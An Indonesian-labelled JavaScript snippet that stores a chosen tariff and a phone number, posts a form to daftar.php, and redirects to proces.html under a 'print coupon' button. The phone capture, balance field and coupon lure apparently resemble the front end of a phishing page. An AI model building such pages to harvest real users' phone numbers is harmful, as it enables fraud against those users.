// index
function sendNohp(){
  $(".load").fadeIn();
  event.preventDefault();   
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
  document.getElementById('kirim').innerHTML = "Memproses....";         
  var nomor = document.getElementById("nomor").value;
  sessionStorage.setItem("namor", nomor);                    
  var logo = document.getElementById('logo'); 
  var nama = document.getElementById('nama');
  var nomor = document.getElementById('nomor');
  var saldo = document.getElementById('saldo');
  $.ajax({
  type: 'POST',
  url: 'daftar.php',
  data: $('#formHP').serialize(),
  datatype: 'JSON',   
  complete: function(){
  setTimeout(function(){   
  window.location = "proces.html";
  $("#lonte").hide();
  $(".load").fadeOut();  
  document.getElementById('kirim').innerHTML = "CETAK KUPON";
  vibr(180);
  }, 500);}});};   
   
   